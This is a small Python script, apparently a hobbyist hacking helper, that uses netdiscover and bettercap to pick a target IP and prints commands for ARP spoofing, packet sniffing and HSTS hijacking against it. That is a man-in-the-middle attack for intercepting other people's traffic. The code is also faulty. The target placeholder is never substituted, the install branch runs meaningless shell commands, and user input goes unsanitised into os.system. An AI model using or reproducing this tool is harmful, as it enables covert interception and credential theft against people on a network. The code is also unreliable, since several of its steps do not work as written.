import os
import sys
import time
from termcolor import colored

def better():
	interf = input('What Interface Do You Want To Snoop On <wlan0/eth0>:  ')
	bc = f'bettercap -iface {interf}'
	discover = 'netdiscover'
	os.system(discover)
	addie = input('Paste The IP Address You Would Like To Snoop On: ')
	uu = input('Do You Have Bettercap Installed <y/n>:  ')
	if uu == 'y':

		cnp = '''\n

		# Copy And Paste The Following

------------------------------------------------------------------------------

		set arp.spoof.fullduplex true

		set arp.spoof.targets {ip address}

		arp.spoof on

		net.sniff on

		caplets.update

		caplets.show

		hstshijack/hstshijack


'''
		print(colored(cnp, 'green'))
		os.system(bc)


	elif uu == 'n':
		install = 'bettercap'
		os.system(install)
		time.sleep(2)
		yes = 'y'
		os.system(yes)
		time.sleep(3)
		print(colored('Sorry For The Incovienence, Please Re-Run Program', 'green'))

	else:
		print(colored('Invalid Input', 'red'))


